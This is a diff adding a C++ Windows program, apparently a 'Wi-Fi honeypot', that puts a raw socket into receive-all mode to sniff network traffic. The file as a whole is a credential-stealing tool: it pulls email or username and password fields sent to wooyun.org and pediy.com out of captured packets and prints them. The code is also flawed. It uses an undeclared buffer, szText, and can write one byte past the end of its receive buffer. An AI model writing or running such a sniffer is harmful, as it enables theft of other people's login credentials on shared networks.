@@ -1,0 +1,140 @@
+#include <stdio.h>
+#include <winsock2.h>
+#include "DataStruct.h"
+#include "InitSocket.h" 
+#include <iostream>
+#include "mstcpip.h"
+using namespace std;
+CInitSocket initSock;
+int nRet = 0;
+void IsWifiHoneypots(PCHAR pBuff)
+{
+    PIPHEADER pIphdr = (PIPHEADER)pBuff;
+
+    pBuff += (pIphdr->ipVersion & 0xf) * sizeof(ULONG);
+
+    PTCPHEADER pTcpHdr = (PTCPHEADER)pBuff;
+
+    memset(szText, ' ', nRet);
+
+    int dataLen = nRet - sizeof(IPHEADER) - sizeof(TCPHEADER);
+
+    memcpy(szText, &pBuff[sizeof(TCPHEADER)], dataLen);
+
+    int i = 0;
+    char szEmail[MAXBYTE] = {0};
+    PCHAR pEmail = szEmail;
+
+
+
+    if(strstr(szText, "wooyun.org"))
+    if(strstr(szText, "email"))
+    {
+        puts("--------------------------------------------");
+        cout<<"found Wooyun.org password:" << endl;
+
+        pEmail = strstr(szText, "email");
+
+        for(i = 0; (pEmail[i] != '&'); i++);
+
+        pEmail[i] = '\0';
+
+        puts(pEmail);
+
+        pEmail += i + 1;
+
+        if(strstr(pEmail, "password"))
+        {
+            pEmail = strstr(pEmail, "password"); 
+
+            for(i = 0; (pEmail[i] != '&'); i++);
+
+            pEmail[i] = '\0';
+
+            puts(pEmail);
+        }
+
+        puts("--------------------------------------------");
+    }
+
+
+
+    if(strstr(szText, "pediy.com"))
+        if(strstr(szText, "username"))
+        {
+            puts("--------------------------------------------");
+            cout<<"found pediy.com password:" << endl;
+
+            pEmail = strstr(szText, "username");
+
+            for(i = 0; (pEmail[i] != '&'); i++);
+
+            pEmail[i] = '\0';
+
+            puts(pEmail);
+
+            pEmail += i + 1;
+
+            if(strstr(pEmail, "md5password_utf="))
+            {
+                pEmail = strstr(pEmail, "md5password_utf=");
+
+                for(i = 0; (pEmail[i] != 0x20); i++);
+
+                pEmail[i] = '\0';
+
+                puts(pEmail);
+            }
+
+            puts("--------------------------------------------");
+    }
+}
+
+int main(void) 
+{
+    system("chcp 936 & cls & title windows wifi ÃÛ¹Þ by °ë½ï°ËƒÉ & color 0a");
+
+    SOCKET sRaw = socket(AF_INET, SOCK_RAW, IPPROTO_IP);
+
+    char szHostName[56];
+
+    SOCKADDR_IN localAddr;
+
+    struct hostent *pHost;
+    gethostname(szHostName, 56);
+    if ((pHost = gethostbyname((char*)szHostName)) == NULL)
+    {
+        return 0;
+    }
+    localAddr.sin_family = AF_INET;
+    localAddr.sin_port = htons(0);
+    memcpy(&localAddr.sin_addr.S_un.S_addr, pHost->h_addr_list[1], pHost->h_length);
+
+    if (bind(sRaw, (PSOCKADDR)&localAddr, sizeof(localAddr)) == SOCKET_ERROR)
+    {
+        return 0;
+    }
+
+    DWORD dwValue = 1;
+
+    if (ioctlsocket(sRaw, SIO_RCVALL, &dwValue) != 0)
+    {
+        return 0;
+    }
+
+    cout << "<<Listen in Wooyun.org and pediy.com>>" << endl << endl;
+
+    char buff[1024];
+    while(true)
+    {
+        nRet = recv(sRaw, buff, 1024, 0);
+        if (nRet > 0)
+        {
+            buff[nRet] = '\0';
+            IsWifiHoneypots(buff);
+        }
+    }
+    closesocket(sRaw); 
+
+    return 0;
+}
